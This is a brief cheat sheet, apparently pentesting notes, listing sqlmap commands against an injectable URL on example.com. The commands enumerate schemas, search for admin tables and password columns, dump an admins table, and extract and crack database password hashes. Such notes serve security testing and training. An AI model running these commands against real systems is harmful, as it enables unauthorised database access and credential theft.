# Advanced Database Enumeration
***
### DB Schema Enumeration (exfiltrate the structure of all the tables)
```bash
$ sqlmap -u "http://www.example.com/?id=1337" --schema
```

### Searching for data (using the LIKE operator)
```bash
$ sqlmap -u "http://www.example.com/?id=1337" --search -T admin
```
#### Search for a column whose name contains "pass" string
```bash
$ sqlmap -u "http://www.example.com/?id=1337" --search -C pass
```

### Password Enumeration and Cracking
```bash
$ sqlmap -u "http://www.example.com/?id=1337" --dump -D root -T admins
```
#### SQLMap has automatic password hashes cracking . The hash cracking attacks are performed in a multi-processing manner, based on the number of cores available on the user's computer.

### DB Users Password Enumeration and Cracking
```bash
$ sqlmap -u "http://www.example.com/?id=1337" --passwords --batch
```